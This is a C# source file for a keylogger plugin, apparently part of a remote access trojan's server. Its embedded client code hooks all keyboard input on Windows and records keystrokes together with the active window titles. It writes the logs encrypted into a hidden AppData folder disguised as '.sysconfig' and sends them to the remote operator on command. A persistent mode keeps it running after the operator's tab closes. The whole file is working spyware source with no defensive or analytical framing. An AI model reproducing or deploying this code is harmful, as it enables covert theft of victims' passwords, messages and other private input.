// File: Plugins/Builtin/KeyloggerPlugin.cs
#nullable disable

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.Versioning;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Effects;
using System.Windows.Shapes;
using System.Windows.Threading;

namespace WpfApp.Plugins.Builtin
{
    [SupportedOSPlatform("windows")]
    public class KeyloggerPlugin : IServerPlugin
    {
        private PluginHost _host;
        private readonly ConcurrentDictionary<string, KeyloggerUI> _clientUIs = new();
        private readonly ConcurrentDictionary<string, bool> _persistentKeylogEnabled = new();
        // Track which clients have active plugin channels we want to keep alive
        private readonly ConcurrentDictionary<string, bool> _keepAliveClients = new();

        public string PluginId => "keylog";
        public string DisplayName => "Keylogger";
        public string Version => "1.0.0";
        public string Description => "Offline keylogger with encrypted local storage and log retrieval.";

        public bool IsPersistentKeylogEnabled(string clientId) =>
            _persistentKeylogEnabled.TryGetValue(clientId, out var v) && v;

        public void SetPersistentKeylog(string clientId, bool enabled)
        {
            _persistentKeylogEnabled[clientId] = enabled;
            _keepAliveClients[clientId] = enabled;
        }

        /// <summary>
        /// Called by the plugin host/tab system to check if this plugin should remain
        /// running for a given client even when the UI tab is closed.
        /// Your tab close handler should check this before stopping the client plugin.
        /// </summary>
        public bool ShouldKeepAlive(string clientId) =>
            _keepAliveClients.TryGetValue(clientId, out var v) && v;

        public Task Initialize(PluginHost host)
        {
            _host = host;
            return Task.CompletedTask;
        }

        public Task Shutdown()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
            _persistentKeylogEnabled.Clear();
            _keepAliveClients.Clear();
            return Task.CompletedTask;
        }

        public string GetClientCode()
        {
            return @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientPlugin_keylog
{
    public class Main
    {
        private Func<byte[], Task> _send;
        private CancellationTokenSource _cts = new CancellationTokenSource();
        private int _flushIntervalMs = 15000;
        private long _maxLogFileSize = 5 * 1024 * 1024;

        // Hook
        private IntPtr _hookId = IntPtr.Zero;
        private HookProc _hookProc;
        private Thread _hookThread;
        private volatile bool _hookRunning = false;
        private uint _hookThreadId;

        // Buffers
        private readonly object _bufferLock = new object();
        private StringBuilder _logBuffer = new StringBuilder();
        private string _lastWindowTitle = """";

        // Key state
        private readonly HashSet<int> _pressedKeys = new HashSet<int>();

        // Pressed key chars for holding detection (Quasar parity)
        private readonly List<char> _pressedKeyChars = new List<char>();

        // Ignore special key rendering when modifiers were used for char input
        private bool _ignoreSpecialKeys;

        // Pending modifier combo buffer (built on keydown, flushed on keyup)
        private readonly StringBuilder _comboBuffer = new StringBuilder();

        // Encryption key
        private byte[] _encKey;

        // Log directory
        private string _logDir;

        // Delegates and constants
        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYUP = 0x0101;
        private const int WM_SYSKEYDOWN = 0x0104;
        private const int WM_SYSKEYUP = 0x0105;
        private const uint WM_QUIT = 0x0012;

        [DllImport(""user32.dll"", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport(""user32.dll"", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport(""user32.dll"", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport(""kernel32.dll"", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport(""user32.dll"")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport(""user32.dll"", CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

        [DllImport(""user32.dll"")]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport(""user32.dll"")]
        private static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

        [DllImport(""user32.dll"")]
        private static extern bool TranslateMessage(ref MSG lpMsg);

        [DllImport(""user32.dll"")]
        private static extern IntPtr DispatchMessage(ref MSG lpMsg);

        [DllImport(""user32.dll"")]
        private static extern bool PostThreadMessage(uint idThread, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport(""kernel32.dll"")]
        private static extern uint GetCurrentThreadId();

        [DllImport(""user32.dll"")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);

        [DllImport(""user32.dll"")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport(""user32.dll"")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);

        [StructLayout(LayoutKind.Sequential)]
        private struct MSG
        {
            public IntPtr hwnd;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public int pt_x;
            public int pt_y;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct KBDLLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public uint flags;
            public uint time;
            public IntPtr dwExtraInfo;
        }

        public async Task Run(Func<byte[], Task> sendData, Func<Task<byte[]>> receiveData)
        {
            _send = sendData;
            InitEncryption();
            InitLogDir();

            StartHook();

            await SendAck(""Keylogger active"");

            var recvTask = Task.Run(async () =>
            {
                while (!_cts.IsCancellationRequested)
                {
                    try
                    {
                        byte[] data = await receiveData();
                        if (data == null || data.Length == 0) break;
                        await HandleCommand(data);
                    }
                    catch { break; }
                }
            });

            var flushTask = Task.Run(() =>
            {
                while (!_cts.IsCancellationRequested)
                {
                    for (int i = 0; i < _flushIntervalMs / 100; i++)
                    {
                        if (_cts.IsCancellationRequested) break;
                        Thread.Sleep(100);
                    }
                    FlushToDisk();
                }
            });

            await Task.WhenAny(recvTask, flushTask);
            _cts.Cancel();
            FlushToDisk();
            StopHook();
        }

        private void InitEncryption()
        {
            string seed = Environment.MachineName + ""|"" + Environment.UserName + ""|keylog_salt_v1"";
            using (SHA256 sha = SHA256.Create())
            {
                _encKey = sha.ComputeHash(Encoding.UTF8.GetBytes(seed));
            }
        }

        private void InitLogDir()
        {
            _logDir = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "".sysconfig"", ""logs""
            );
            try
            {
                if (!Directory.Exists(_logDir))
                {
                    DirectoryInfo di = Directory.CreateDirectory(_logDir);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                }
            }
            catch { }
        }

        private async Task HandleCommand(byte[] data)
        {
            if (data.Length < 1) return;
            byte cmd = data[0];

            switch (cmd)
            {
                case 0x01:
                    await SendLogFileList();
                    break;

                case 0x02:
                    if (data.Length > 1)
                    {
                        string fileName = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                        await SendLogFileContent(fileName);
                    }
                    break;

                case 0x03:
                    if (data.Length > 1)
                    {
                        string fileName = Encoding.UTF8.GetString(data, 1, data.Length - 1);
                        await DeleteLogFile(fileName);
                    }
                    break;

                case 0x04:
                    await DeleteAllLogs();
                    break;

                case 0x05:
                    FlushToDisk();
                    await SendAck(""Flushed to disk"");
                    break;

                case 0x06:
                    await SendStatusInfo();
                    break;

                case 0x07:
                    if (data.Length >= 5)
                    {
                        int interval = data[1] | (data[2] << 8) | (data[3] << 16) | (data[4] << 24);
                        if (interval >= 1000 && interval <= 120000)
                            _flushIntervalMs = interval;
                        await SendAck(""Flush interval: "" + _flushIntervalMs + ""ms"");
                    }
                    break;

                case 0x08:
                    if (data.Length > 1)
                    {
                        byte[] newKey = new byte[data.Length - 1];
                        Buffer.BlockCopy(data, 1, newKey, 0, newKey.Length);
                        _encKey = newKey;
                        await SendAck(""Encryption key updated"");
                    }
                    break;
            }
        }

        private async Task SendLogFileList()
        {
            string errorMsg = null;
            string[] files = null;
            try
            {
                if (!Directory.Exists(_logDir))
                {
                    files = new string[0];
                }
                else
                {
                    files = Directory.GetFiles(_logDir);
                }
            }
            catch (Exception ex)
            {
                errorMsg = ""List failed: "" + ex.Message;
            }

            if (errorMsg != null)
            {
                await SendError(errorMsg);
                return;
            }

            await SendLogList(files);
        }

        private async Task SendLogList(string[] filePaths)
        {
            using (MemoryStream ms = new MemoryStream())
            using (BinaryWriter bw = new BinaryWriter(ms, Encoding.UTF8))
            {
                bw.Write((byte)0x10);
                bw.Write(filePaths.Length);
                foreach (string fp in filePaths)
                {
                    try
                    {
                        FileInfo fi = new FileInfo(fp);
                        string name = fi.Name;
                        bw.Write(name);
                        bw.Write(fi.Length);
                        bw.Write(fi.LastWriteTimeUtc.Ticks);
                    }
                    catch
                    {
                        bw.Write(Path.GetFileName(fp));
                        bw.Write(0L);
                        bw.Write(0L);
                    }
                }
                await _send(ms.ToArray());
            }
        }

        private async Task SendLogFileContent(string fileName)
        {
            string errorMsg = null;
            byte[] sendMsg = null;

            try
            {
                fileName = Path.GetFileName(fileName);
                string filePath = Path.Combine(_logDir, fileName);

                if (!File.Exists(filePath))
                {
                    errorMsg = ""File not found: "" + fileName;
                }
                else
                {
                    byte[] encData = File.ReadAllBytes(filePath);
                    byte[] decData = DecryptData(encData);

                    if (decData == null)
                    {
                        errorMsg = ""Decryption failed for: "" + fileName;
                    }
                    else
                    {
                        byte[] nameBytes = Encoding.UTF8.GetBytes(fileName);
                        sendMsg = new byte[1 + 2 + nameBytes.Length + decData.Length];
                        sendMsg[0] = 0x11;
                        sendMsg[1] = (byte)(nameBytes.Length & 0xFF);
                        sendMsg[2] = (byte)((nameBytes.Length >> 8) & 0xFF);
                        Buffer.BlockCopy(nameBytes, 0, sendMsg, 3, nameBytes.Length);
                        Buffer.BlockCopy(decData, 0, sendMsg, 3 + nameBytes.Length, decData.Length);
                    }
                }
            }
            catch (Exception ex)
            {
                errorMsg = ""Read failed: "" + ex.Message;
            }

            if (errorMsg != null)
            {
                await SendError(errorMsg);
            }
            else if (sendMsg != null)
            {
                await _send(sendMsg);
            }
        }

        private async Task DeleteLogFile(string fileName)
        {
            string errorMsg = null;
            bool deleted = false;

            try
            {
                fileName = Path.GetFileName(fileName);
                string filePath = Path.Combine(_logDir, fileName);
                if (File.Exists(filePath))
                {
                    File.Delete(filePath);
                    deleted = true;
                }
                else
                {
                    errorMsg = ""File not found: "" + fileName;
                }
            }
            catch (Exception ex)
            {
                errorMsg = ""Delete failed: "" + ex.Message;
            }

            if (errorMsg != null)
            {
                await SendError(errorMsg);
            }
            else if (deleted)
            {
                await SendAck(""Deleted: "" + fileName);
                await SendLogFileList();
            }
        }

        private async Task DeleteAllLogs()
        {
            string errorMsg = null;
            int deletedCount = 0;

            try
            {
                if (Directory.Exists(_logDir))
                {
                    foreach (string f in Directory.GetFiles(_logDir))
                    {
                        try { File.Delete(f); deletedCount++; } catch { }
                    }
                }
            }
            catch (Exception ex)
            {
                errorMsg = ex.Message;
            }

            if (errorMsg != null)
            {
                await SendError(""Delete all failed: "" + errorMsg);
            }
            else
            {
                await SendAck(""Deleted "" + deletedCount + "" log file(s)"");
            }

            await SendLogFileList();
        }

        private async Task SendStatusInfo()
        {
            int fileCount = 0;
            long totalSize = 0;
            try
            {
                if (Directory.Exists(_logDir))
                {
                    string[] files = Directory.GetFiles(_logDir);
                    fileCount = files.Length;
                    foreach (string f in files)
                    {
                        try { totalSize += new FileInfo(f).Length; } catch { }
                    }
                }
            }
            catch { }

            int bufLen;
            lock (_bufferLock) { bufLen = _logBuffer.Length; }

            string status = ""Hook="" + (_hookRunning ? ""active"" : ""inactive"") +
                            "", Files="" + fileCount +
                            "", Size="" + FormatSize(totalSize) +
                            "", Buffer="" + bufLen + "" chars"" +
                            "", Flush="" + _flushIntervalMs + ""ms"";

            await SendAck(status);
        }

        private string FormatSize(long bytes)
        {
            if (bytes < 1024) return bytes + ""B"";
            if (bytes < 1024 * 1024) return (bytes / 1024) + ""KB"";
            return (bytes / (1024 * 1024)) + ""MB"";
        }

        private void FlushToDisk()
        {
            string content;
            lock (_bufferLock)
            {
                if (_logBuffer.Length == 0) return;
                content = _logBuffer.ToString();
                _logBuffer.Clear();
            }

            try
            {
                if (!Directory.Exists(_logDir))
                {
                    DirectoryInfo di = Directory.CreateDirectory(_logDir);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                }

                string dateStr = DateTime.UtcNow.ToString(""yyyy-MM-dd"");
                string filePath = Path.Combine(_logDir, dateStr);

                int i = 0;
                string testPath = filePath;
                while (File.Exists(testPath))
                {
                    long len = new FileInfo(testPath).Length;
                    if (len < _maxLogFileSize) break;
                    i++;
                    testPath = filePath + ""_"" + i;
                }
                filePath = testPath;

                bool isNew = !File.Exists(filePath);

                StringBuilder html = new StringBuilder();
                if (isNew)
                {
                    html.Append(""<meta http-equiv='Content-Type' content='text/html; charset=utf-8'/>"");
                    html.Append(""<style>"");
                    html.Append(""body{background:#0d1117;color:#f0f6fc;font-family:Consolas,monospace;font-size:13px;padding:10px;}"");
                    html.Append("".t{color:#58a6ff;font-weight:bold;margin:12px 0 4px 0;}"");
                    html.Append("".k{color:#bb8009;}"");
                    html.Append("".m{color:#da3633;}"");
                    html.Append(""</style>"");
                    html.Append(""<p>Log created: "" + DateTime.UtcNow.ToString(""yyyy-MM-dd HH:mm:ss"") + "" UTC</p>"");
                    _lastWindowTitle = """";
                }

                html.Append(HtmlEncode(content));

                string existing = """";
                if (!isNew)
                {
                    byte[] encExisting = File.ReadAllBytes(filePath);
                    byte[] decExisting = DecryptData(encExisting);
                    if (decExisting != null)
                        existing = Encoding.UTF8.GetString(decExisting);
                }

                string fullHtml = existing + html.ToString();
                byte[] plainBytes = Encoding.UTF8.GetBytes(fullHtml);
                byte[] encrypted = EncryptData(plainBytes);
                File.WriteAllBytes(filePath, encrypted);
            }
            catch { }
        }

        private string HtmlEncode(string text)
        {
            StringBuilder sb = new StringBuilder();
            int i = 0;
            while (i < text.Length)
            {
                char c = text[i];
                if (c == '\n')
                {
                    if (i + 1 < text.Length && text[i + 1] == '\n')
                    {
                        int bracketStart = i + 2;
                        if (bracketStart < text.Length && text[bracketStart] == '[')
                        {
                            int bracketEnd = text.IndexOf(']', bracketStart);
                            if (bracketEnd > bracketStart && text.Substring(bracketStart, bracketEnd - bracketStart + 1).Contains("" UTC""))
                            {
                                string title = text.Substring(bracketStart, bracketEnd - bracketStart + 1);
                                sb.Append(""<p class='t'>"");
                                sb.Append(EscHtml(title));
                                sb.Append(""</p>"");
                                i = bracketEnd + 1;
                                if (i < text.Length && text[i] == '\n') i++;
                                continue;
                            }
                        }
                    }
                    sb.Append(""<br>"");
                    i++;
                }
                else if (c == '[')
                {
                    int end = text.IndexOf(']', i);
                    if (end > i)
                    {
                        string bracket = text.Substring(i, end - i + 1);
                        if (bracket.StartsWith(""[Ctrl+"") || bracket.StartsWith(""[Alt+"") ||
                            bracket.StartsWith(""[Win+"") || bracket.StartsWith(""[Shift+""))
                        {
                            sb.Append(""<span class='m'>"" + EscHtml(bracket) + ""</span>"");
                        }
                        else
                        {
                            sb.Append(""<span class='k'>"" + EscHtml(bracket) + ""</span>"");
                        }
                        i = end + 1;
                    }
                    else
                    {
                        sb.Append(EscHtml(c.ToString()));
                        i++;
                    }
                }
                else
                {
                    sb.Append(EscHtml(c.ToString()));
                    i++;
                }
            }
            return sb.ToString();
        }

        private string EscHtml(string s)
        {
            return s.Replace(""&"", ""&amp;"").Replace(""<"", ""&lt;"").Replace("">"", ""&gt;"").Replace(""\"""", ""&quot;"");
        }

        private byte[] EncryptData(byte[] plaintext)
        {
            using (Aes aes = Aes.Create())
            {
                aes.Key = _encKey;
                aes.GenerateIV();
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (ICryptoTransform enc = aes.CreateEncryptor())
                {
                    byte[] cipher = enc.TransformFinalBlock(plaintext, 0, plaintext.Length);
                    byte[] result = new byte[16 + cipher.Length];
                    Buffer.BlockCopy(aes.IV, 0, result, 0, 16);
                    Buffer.BlockCopy(cipher, 0, result, 16, cipher.Length);
                    return result;
                }
            }
        }

        private byte[] DecryptData(byte[] encrypted)
        {
            if (encrypted == null || encrypted.Length < 17) return null;
            try
            {
                byte[] iv = new byte[16];
                Buffer.BlockCopy(encrypted, 0, iv, 0, 16);
                int cipherLen = encrypted.Length - 16;
                byte[] cipher = new byte[cipherLen];
                Buffer.BlockCopy(encrypted, 16, cipher, 0, cipherLen);

                using (Aes aes = Aes.Create())
                {
                    aes.Key = _encKey;
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;

                    using (ICryptoTransform dec = aes.CreateDecryptor())
                    {
                        return dec.TransformFinalBlock(cipher, 0, cipher.Length);
                    }
                }
            }
            catch
            {
                return null;
            }
        }

        private void StartHook()
        {
            if (_hookRunning) return;

            _hookThread = new Thread(() =>
            {
                _hookThreadId = GetCurrentThreadId();
                _hookProc = new HookProc(KeyboardHookCallback);

                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    _hookId = SetWindowsHookEx(WH_KEYBOARD_LL, _hookProc, GetModuleHandle(curModule.ModuleName), 0);
                }

                if (_hookId == IntPtr.Zero)
                {
                    _hookRunning = false;
                    return;
                }

                _hookRunning = true;

                MSG msg;
                while (GetMessage(out msg, IntPtr.Zero, 0, 0))
                {
                    TranslateMessage(ref msg);
                    DispatchMessage(ref msg);
                }

                UnhookWindowsHookEx(_hookId);
                _hookId = IntPtr.Zero;
                _hookRunning = false;
            });
            _hookThread.IsBackground = true;
            _hookThread.SetApartmentState(ApartmentState.STA);
            _hookThread.Start();

            int wait = 0;
            while (!_hookRunning && wait < 3000)
            {
                Thread.Sleep(10);
                wait += 10;
            }
        }

        private void StopHook()
        {
            if (!_hookRunning) return;
            try { PostThreadMessage(_hookThreadId, WM_QUIT, IntPtr.Zero, IntPtr.Zero); } catch { }
            int wait = 0;
            while (_hookRunning && wait < 3000)
            {
                Thread.Sleep(10);
                wait += 10;
            }
            if (_hookId != IntPtr.Zero)
            {
                try { UnhookWindowsHookEx(_hookId); } catch { }
                _hookId = IntPtr.Zero;
            }
            _hookRunning = false;
        }

        private IntPtr KeyboardHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                int msg = wParam.ToInt32();
                KBDLLHOOKSTRUCT hookStruct = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
                int vk = (int)hookStruct.vkCode;

                if (msg == WM_KEYDOWN || msg == WM_SYSKEYDOWN)
                {
                    OnKeyDown(vk);
                    OnKeyPress(vk, hookStruct.scanCode);
                }
                else if (msg == WM_KEYUP || msg == WM_SYSKEYUP)
                {
                    OnKeyUp(vk);
                }
            }
            return CallNextHookEx(_hookId, nCode, wParam, lParam);
        }

        private void OnKeyDown(int vk)
        {
            string title = GetActiveWindowTitle();
            if (!string.IsNullOrEmpty(title) && title != _lastWindowTitle)
            {
                _lastWindowTitle = title;
                lock (_bufferLock)
                {
                    _logBuffer.Append(""\n\n["" + title + "" - "" + DateTime.UtcNow.ToString(""HH:mm:ss"") + "" UTC]\n"");
                }
            }

            if (_pressedKeys.Contains(vk)) return;
            if (IsExcludedKey(vk)) return;
            _pressedKeys.Add(vk);

            if (IsModifierKey(vk)) return;

            bool ctrl = IsKeyDown(0xA2) || IsKeyDown(0xA3);
            bool alt = IsKeyDown(0xA4) || IsKeyDown(0xA5);
            bool shift = IsKeyDown(0xA0) || IsKeyDown(0xA1);
            bool win = IsKeyDown(0x5B) || IsKeyDown(0x5C);

            if (ctrl || alt || win)
            {
                StringBuilder combo = new StringBuilder(""["");
                if (ctrl) combo.Append(""Ctrl+"");
                if (alt) combo.Append(""Alt+"");
                if (win) combo.Append(""Win+"");
                if (shift) combo.Append(""Shift+"");
                combo.Append(GetVkName(vk));
                combo.Append(""]"");
                lock (_bufferLock) { _comboBuffer.Append(combo.ToString()); }
                return;
            }
        }

        private void OnKeyPress(int vk, uint scanCode)
        {
            if (_comboBuffer.Length > 0) return;
            if (IsModifierKey(vk)) return;

            string ch = VkToChar((uint)vk, scanCode);
            if (ch == null || ch.Length == 0) return;

            char c = ch[0];
            if (char.IsControl(c)) return;

            if (_pressedKeyChars.FindAll(s => s == c).Count > 1)
                return;

            _pressedKeyChars.Add(c);

            if (IsAnyModifierDown())
                _ignoreSpecialKeys = true;

            lock (_bufferLock)
            {
                _logBuffer.Append(EscHtml(c.ToString()));
            }
        }

        private void OnKeyUp(int vk)
        {
            if (_comboBuffer.Length > 0)
            {
                lock (_bufferLock) { _logBuffer.Append(_comboBuffer.ToString()); }
                _comboBuffer.Clear();
            }

            if (!_ignoreSpecialKeys && !IsModifierKey(vk) && !IsExcludedKey(vk))
            {
                string special = GetSpecialKeyText(vk);
                if (special != null)
                {
                    lock (_bufferLock)
                    {
                        if (special == ""\n"")
                            _logBuffer.Append(""<span class='k'>[Enter]</span><br>"");
                        else
                            _logBuffer.Append(""<span class='k'>"" + EscHtml(special) + ""</span>"");
                    }
                }
            }

            _pressedKeys.Remove(vk);
            _pressedKeyChars.Clear();
            _ignoreSpecialKeys = false;
        }

        private string VkToChar(uint vk, uint scanCode)
        {
            byte[] keyState = new byte[256];
            GetKeyboardState(keyState);
            StringBuilder result = new StringBuilder(4);
            uint sc = MapVirtualKey(vk, 0);
            int ret = ToUnicode(vk, sc, keyState, result, result.Capacity, 0);
            if (ret == 1)
            {
                char c = result[0];
                if (char.IsControl(c)) return null;
                return c.ToString();
            }
            return null;
        }

        private bool IsModifierKey(int vk)
        {
            return vk == 0xA0 || vk == 0xA1 ||
                   vk == 0xA2 || vk == 0xA3 ||
                   vk == 0xA4 || vk == 0xA5 ||
                   vk == 0x5B || vk == 0x5C;
        }

        private bool IsKeyDown(int vk)
        {
            return _pressedKeys.Contains(vk);
        }

        private bool IsExcludedKey(int vk)
        {
            return vk == 0x01 || vk == 0x02 || vk == 0x03 ||
                   vk == 0x04 || vk == 0x05 || vk == 0x06;
        }

        private bool IsAnyModifierDown()
        {
            return _pressedKeys.Contains(0xA0) || _pressedKeys.Contains(0xA1) ||
                   _pressedKeys.Contains(0xA2) || _pressedKeys.Contains(0xA3) ||
                   _pressedKeys.Contains(0xA4) || _pressedKeys.Contains(0xA5) ||
                   _pressedKeys.Contains(0x5B) || _pressedKeys.Contains(0x5C);
        }

        private string GetVkName(int vk)
        {
            Keys k = (Keys)vk;
            string name = k.ToString();
            if (name.Length == 2 && name[0] == 'D' && char.IsDigit(name[1]))
                return name[1].ToString();
            return name;
        }

        private string GetSpecialKeyText(int vk)
        {
            switch (vk)
            {
                case 0x0D: return ""\n"";
                case 0x09: return ""[Tab]"";
                case 0x08: return ""[Backspace]"";
                case 0x20: return "" "";
                case 0x1B: return ""[Esc]"";
                case 0x2E: return ""[Del]"";
                case 0x2D: return ""[Ins]"";
                case 0x24: return ""[Home]"";
                case 0x23: return ""[End]"";
                case 0x21: return ""[PgUp]"";
                case 0x22: return ""[PgDn]"";
                case 0x26: return ""[Up]"";
                case 0x28: return ""[Down]"";
                case 0x25: return ""[Left]"";
                case 0x27: return ""[Right]"";
                case 0x2C: return ""[PrtSc]"";
                case 0x14: return ""[CapsLock]"";
                case 0x90: return ""[NumLock]"";
                case 0x70: return ""[F1]"";
                case 0x71: return ""[F2]"";
                case 0x72: return ""[F3]"";
                case 0x73: return ""[F4]"";
                case 0x74: return ""[F5]"";
                case 0x75: return ""[F6]"";
                case 0x76: return ""[F7]"";
                case 0x77: return ""[F8]"";
                case 0x78: return ""[F9]"";
                case 0x79: return ""[F10]"";
                case 0x7A: return ""[F11]"";
                case 0x7B: return ""[F12]"";
                default: return null;
            }
        }

        private string GetActiveWindowTitle()
        {
            IntPtr hwnd = GetForegroundWindow();
            if (hwnd == IntPtr.Zero) return """";
            int len = GetWindowTextLength(hwnd);
            if (len <= 0) return """";
            StringBuilder sb = new StringBuilder(len + 1);
            GetWindowText(hwnd, sb, sb.Capacity);
            return sb.ToString();
        }

        private async Task SendAck(string message)
        {
            byte[] mb = Encoding.UTF8.GetBytes(message);
            byte[] msg = new byte[mb.Length + 1];
            msg[0] = 0xFE;
            Buffer.BlockCopy(mb, 0, msg, 1, mb.Length);
            try { await _send(msg); } catch { }
        }

        private async Task SendError(string message)
        {
            byte[] mb = Encoding.UTF8.GetBytes(message);
            byte[] msg = new byte[mb.Length + 1];
            msg[0] = 0xFF;
            Buffer.BlockCopy(mb, 0, msg, 1, mb.Length);
            try { await _send(msg); } catch { }
        }
    }
}
";
        }

        public UserControl CreateUI(PluginContext context)
        {
            // If we already have a UI for this client (persistent mode was on), reuse it
            if (_clientUIs.TryGetValue(context.ClientId, out var existingUi) && !existingUi.IsDisposed)
            {
                existingUi.Reattach(context);
                return existingUi;
            }

            var ui = new KeyloggerUI(context, _host, this);
            _clientUIs[context.ClientId] = ui;
            return ui;
        }

        public Task OnClientDataReceived(string clientId, byte[] data)
        {
            if (data == null || data.Length == 0) return Task.CompletedTask;
            if (_clientUIs.TryGetValue(clientId, out var ui))
            {
                ui.HandleServerData(data);
            }
            return Task.CompletedTask;
        }

        public Task OnClientDisconnected(string clientId)
        {
            if (!IsPersistentKeylogEnabled(clientId))
            {
                if (_clientUIs.TryRemove(clientId, out var ui))
                {
                    ui.Dispose();
                }
                _keepAliveClients.TryRemove(clientId, out _);
            }
            // If persistent is enabled, we keep the UI and state alive
            return Task.CompletedTask;
        }

        /// <summary>
        /// Called when the plugin tab is closed by the user (X button on tab).
        /// If persistent mode is on, we do NOT stop the client plugin or dispose.
        /// Returns true if the tab close should be suppressed (plugin stays running).
        /// </summary>
        public bool OnTabClosing(string clientId)
        {
            if (IsPersistentKeylogEnabled(clientId))
            {
                // Don't stop the client plugin, don't dispose UI
                // The plugin keeps running on the client side
                return true; // suppress close / keep alive
            }
            return false; // allow normal close
        }

        public void Dispose()
        {
            foreach (var ui in _clientUIs.Values)
                ui.Dispose();
            _clientUIs.Clear();
            _persistentKeylogEnabled.Clear();
            _keepAliveClients.Clear();
        }
    }
}
